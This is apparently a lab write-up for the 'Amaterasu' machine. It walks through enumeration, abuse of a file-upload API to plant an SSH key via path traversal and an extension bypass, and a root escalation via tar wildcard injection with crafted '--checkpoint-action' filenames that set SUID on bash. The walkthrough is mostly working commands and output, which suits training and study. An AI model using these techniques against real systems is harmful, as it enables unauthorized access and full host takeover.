# Amaterasu

## Initial access

Run `autorecon` to enumerate open ports and services:

```
sudo autorecon 192.168.229.249
```

Open ports discovered:

- **21** — FTP (vsftpd 3.0.3)
  - Anonymous login allowed
- **25022** — SSH (OpenSSH 8.6, protocol 2.0)
- **33414** — HTTP (Werkzeug httpd 2.2.3, Python 3.9.13)
  - Additional webpages:
    - `http://192.168.229.249:33414/help`
    - `http://192.168.229.249:33414/info`
- **40080** — HTTP (Apache httpd 2.4.53, Fedora)
  - Additional webpages:
    - `http://192.168.229.249:40080/LICENSE`
    - `http://192.168.229.249:40080/images/`
    - `http://192.168.229.249:40080/styles/`
    - `http://192.168.229.249:40080/icons/`

### FTP Enumeration

Attempted to connect via FTP as anonymous:

```
ftp anonymous@192.168.241.249

ftp> ls
229 Entering Extended Passive Mode (|||54994|)
```

The connection stalled until timeout, and continued enumerating the HTTP services.

### Web Service Enumeration

The Werkzeug HTTP service on port 33414 returned a 404 on the root path. The `/help` endpoint revealed a Python File Server REST API:

```
"GET /info : General Info"
"GET /help : This listing"
"GET /file-list?dir=/tmp : List of the files"
"POST /file-upload : Upload files"
```

The `/info` endpoint confirmed the service details:

```
Python File Server REST API v2.5
Author: Alfredo Moroder
GET /help = List of the commands
```

Listing files in `/tmp` revealed a `flask.tar.gz` and several systemd private directories. Querying `/home` revealed an `alfredo` directory, indicating there is an `alfredo` user on the system.

Testing file upload functionality revealed that the API requires a `file` parameter and a `filename` parameter in the POST request:

```
curl -X POST -F "file=@test.txt" -F "filename=test.txt" http://192.168.229.249:33414/file-upload
{"message":"File successfully uploaded"}
```

The file appeared in `/tmp` as expected. Then tested uploading to an arbitrary directory, which succeeded:

```
curl -X POST -F "file=@test.txt" -F "filename=/home/alfredo/test.txt" http://192.168.229.249:33414/file-upload
{"message":"File successfully uploaded"}
```

Listing `/home/alfredo` confirmed the file was placed there and revealed an `.ssh` directory. This suggested that a public key could be dropped into `authorized_keys` for passwordless SSH access.

Generated an SSH key pair:

```
ssh-keygen
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/kali/.ssh/id_ed25519): /home/kali/OSCP/id_rsa
```

However, the file upload service only allowed `txt`, `pdf`, `png`, `jpg`, `jpeg`, and `gif` file types. Uploading `id_rsa.pub` directly was rejected:

```
curl -X POST -F "file=@id_rsa.pub" -F "filename=/home/alfredo/.ssh/authorized_keys" http://192.168.229.249:33414/file-upload
{"message":"Allowed file types are txt, pdf, png, jpg, jpeg, gif"}
```

By renaming the public key to `id_rsa.pub.txt`, bypassed the restriction and uploaded the file as `authorized_keys`:

```
mv id_rsa.pub id_rsa.pub.txt
curl -X POST -F "file=@id_rsa.pub.txt" -F "filename=/home/alfredo/.ssh/authorized_keys" http://192.168.229.249:33414/file-upload
{"message":"File successfully uploaded"}
```

Verified that the key was in place via the file-list endpoint, and connected to SSH:

```
ssh alfredo@192.168.229.249 -p 25022 -i id_rsa
...
[alfredo@fedora ~]$ whoami
alfredo
```

Retrieved the local flag:

```
[alfredo@fedora ~]$ cat local.txt
7c7e6dcafdab22ce57fe20784e54e418
```

## Privilege escalation

Uploaded `linpeas.sh` to the target via the same file upload vulnerability and ran it:

```
mv linpeas.sh linpeas.sh.txt
curl -X POST -F "file=@linpeas.sh.txt" -F "filename=/home/alfredo/linpeas.sh" http://192.168.229.249:33414/file-upload
{"message":"File successfully uploaded"}

[alfredo@fedora ~]$ chmod +x linpeas.sh
[alfredo@fedora ~]$ ./linpeas.sh
```

LinPEAS identified a cron job running as root every minute:

```
*/1 * * * * root /usr/local/bin/backup-flask.sh
```

Inspecting the script revealed the privilege escalation vector:

```
#!/bin/sh
export PATH="/home/alfredo/restapi:$PATH"
cd /home/alfredo/restapi
tar czf /tmp/flask.tar.gz *
```

The cron job runs as `root` and uses `tar` with a wildcard (`*`) in a directory that is writable by the user. By creating files named `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh` in that directory, the wildcard expands to these arguments, causing `tar` to execute `sh shell.sh`.

Created the exploit files in `/home/alfredo/restapi`:

```
[alfredo@fedora ~]$ cd /home/alfredo/restapi
[alfredo@fedora restapi]$ touch -- "--checkpoint=1"
[alfredo@fedora restapi]$ touch -- "--checkpoint-action=exec=sh shell.sh"

# Insert these lines into shell.sh
#!/bin/sh
chmod +s /bin/bash

[alfredo@fedora restapi]$ chmod +x shell.sh
```

This caused `tar` to execute `sh shell.sh`, which set the SUID and SGID bits on `/bin/bash`. Verified and spawned a root shell:

```
[alfredo@fedora restapi]$ ls -la /bin/bash
-rwsr-sr-x. 1 root root 1390080 Jan 25  2021 /bin/bash

[alfredo@fedora restapi]$ /bin/bash -p
bash-5.1# whoami
root
```

Retrieved the proof flag:

```
bash-5.1# cd /root
bash-5.1# cat proof.txt
c7ca02b48f4a06b2fae8113a88bf30e5
```
